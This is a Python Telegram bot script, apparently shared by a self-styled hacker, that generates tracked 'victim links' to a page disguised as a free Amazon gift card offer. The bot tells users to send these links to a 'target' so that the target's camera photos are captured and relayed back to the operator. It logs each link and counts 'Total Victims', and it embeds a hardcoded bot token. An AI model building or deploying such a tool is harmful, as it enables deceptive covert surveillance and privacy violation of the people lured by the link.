#!/usr/bin/env python3
"""
CAMERA HACK TELEGRAM BOT
Developed by: GENIUS HACKER ADITYA
"""

import os
import logging
import random
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============================================================
# 🔥 CONFIG — APNA BOT TOKEN DAALO
# ============================================================
BOT_TOKEN = "8990489472:AAHIiz8-qxH6gdCX2HksX2OS_xelaFq7foE"
BASE_URL = "https://freegiftcard-amazon.netlify.app/"

# Social Media Links
YOUTUBE_URL = "https://youtube.com/@geniushacker29?si=vFcTzilEyEq1t3ah"
WHATSAPP_URL = "https://chat.whatsapp.com/GcDcK5iL4hr2rD0IyI1SDW?s=cl&p=a&mlu=4"
# ============================================================

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Store user data
user_links = {}
user_verified = {}  # Track verified users

def generate_victim_id():
    """Generate unique victim ID"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

# ============================================================
# WELCOME SCREEN
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome screen with join buttons"""
    user = update.effective_user
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📺 Join YouTube Channel", url=YOUTUBE_URL)],
        [InlineKeyboardButton("💬 Join WhatsApp Group", url=WHATSAPP_URL)],
        [InlineKeyboardButton("✅ I Have Joined ✅", callback_data="check_join")],
        [InlineKeyboardButton("🔹 Skip & Continue", callback_data="skip_join")]
    ])
    
    await update.message.reply_text(
        f"🎯 *WELCOME TO CAMERA HACK BOT*\n\n"
        f"👤 Hello *{user.first_name}*!\n\n"
        f"📌 *Before using this bot:*\n"
        f"1️⃣ Join our YouTube Channel\n"
        f"2️⃣ Join our WhatsApp Group\n"
        f"3️⃣ Click 'I Have Joined' to verify\n\n"
        f"⚡ *Or click 'Skip & Continue' to use directly!*\n\n"
        f"🔹 *Developed by GENIUS HACKER ADITYA*",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

# ============================================================
# JOIN CHECK & VERIFICATION
# ============================================================

async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if user joined (always passes - no real check)"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user_verified[user_id] = True
    
    # Send verification success message with generate link button
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Generate Camera Hack Link", callback_data="generate_link")],
        [InlineKeyboardButton("📺 YouTube Channel", url=YOUTUBE_URL)],
        [InlineKeyboardButton("💬 WhatsApp Group", url=WHATSAPP_URL)]
    ])
    
    await query.message.edit_text(
        f"✅ *Verification Successful!*\n\n"
        f"🎉 You are now verified to use this bot.\n\n"
        f"📌 *Click the button below to generate your camera hack link.*\n\n"
        f"⚡ *Developed by GENIUS HACKER ADITYA*",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

async def skip_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Skip join - directly verified"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user_verified[user_id] = True
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Generate Camera Hack Link", callback_data="generate_link")],
        [InlineKeyboardButton("📺 YouTube Channel", url=YOUTUBE_URL)],
        [InlineKeyboardButton("💬 WhatsApp Group", url=WHATSAPP_URL)]
    ])
    
    await query.message.edit_text(
        f"⏭️ *Skipped Joining!*\n\n"
        f"✅ You can still use this bot freely.\n\n"
        f"📌 *Click the button below to generate your camera hack link.*\n\n"
        f"⚡ *Developed by GENIUS HACKER ADITYA*",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

# ============================================================
# GENERATE CAMERA HACK LINK
# ============================================================

async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate camera hack link for victim"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Generate unique victim ID
    victim_id = generate_victim_id()
    user_links[user_id] = victim_id
    
    # Create victim link
    victim_link = f"{BASE_URL}?id={victim_id}&chat_id={user_id}"
    
    # Save to file
    with open("links.txt", "a") as f:
        f.write(f"{user_id}|{victim_id}|{victim_link}\n")
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={victim_link}")],
        [InlineKeyboardButton("📋 Copy Link", callback_data="copy_link")],
        [InlineKeyboardButton("🔄 New Link", callback_data="generate_link")],
        [InlineKeyboardButton("📺 YouTube", url=YOUTUBE_URL)],
        [InlineKeyboardButton("💬 WhatsApp", url=WHATSAPP_URL)]
    ])
    
    await query.message.edit_text(
        f"🎯 *CAMERA HACK LINK GENERATED!*\n\n"
        f"🆔 Victim ID: `{victim_id}`\n\n"
        f"🔗 *Your Victim Link:*\n"
        f"`{victim_link}`\n\n"
        f"📌 *How to use:*\n"
        f"1️⃣ Share this link with your target\n"
        f"2️⃣ Target clicks and grants camera permission\n"
        f"3️⃣ Photo will be sent here automatically\n\n"
        f"⚠️ *Use for educational purposes only!*\n\n"
        f"⚡ *Developed by GENIUS HACKER ADITYA*",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

async def copy_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copy link callback"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    victim_id = user_links.get(user_id, '')
    if not victim_id:
        await query.message.reply_text("❌ No link found. Use /start")
        return
    
    victim_link = f"{BASE_URL}?id={victim_id}&chat_id={user_id}"
    
    await query.message.reply_text(
        f"📋 *Copy this link:*\n\n"
        f"`{victim_link}`\n\n"
        f"Send it to your target.\n\n"
        f"⚡ *GENIUS HACKER ADITYA*",
        parse_mode='Markdown'
    )

# ============================================================
# HELP & STATS
# ============================================================

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user stats"""
    user_id = update.effective_user.id
    victim_id = user_links.get(user_id, 'Not generated')
    
    try:
        with open("links.txt", "r") as f:
            total = len(f.readlines())
    except:
        total = 0
    
    await update.message.reply_text(
        f"📊 *Your Stats*\n\n"
        f"🆔 Your Victim ID: `{victim_id}`\n"
        f"📌 Total Victims: {total}\n"
        f"✅ Verified: {user_verified.get(user_id, False)}\n\n"
        f"Type /start to get your link.",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    await update.message.reply_text(
        f"🤖 *Camera Hack Bot*\n\n"
        f"📌 *Commands:*\n"
        f"/start - Welcome screen\n"
        f"/stats - Show stats\n"
        f"/help - Show this\n\n"
        f"📌 *How it works:*\n"
        f"1️⃣ Start bot → Welcome screen\n"
        f"2️⃣ Join or Skip → Get verified\n"
        f"3️⃣ Generate link → Share with target\n"
        f"4️⃣ Target clicks → Photo sent here\n\n"
        f"⚡ *Developed by GENIUS HACKER ADITYA*",
        parse_mode='Markdown'
    )

# ============================================================
# MAIN
# ============================================================

def main():
    print("""
╔═══════════════════════════════════════════╗
║      CAMERA HACK TELEGRAM BOT             ║
║     Developed by: GENIUS HACKER ADITYA    ║
╚═══════════════════════════════════════════╝
    """)
    print("🤖 Bot starting...")
    print("📺 YouTube: " + YOUTUBE_URL)
    print("💬 WhatsApp: " + WHATSAPP_URL)
    print("✅ Join check removed - everyone can use!")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("help", help_command))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
    app.add_handler(CallbackQueryHandler(skip_join, pattern="skip_join"))
    app.add_handler(CallbackQueryHandler(generate_link, pattern="generate_link"))
    app.add_handler(CallbackQueryHandler(copy_link_callback, pattern="copy_link"))
    
    print("✅ Bot is running!")
    app.run_polling(allowed_updates=["message", "callback_query"])

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n❌ Bot stopped")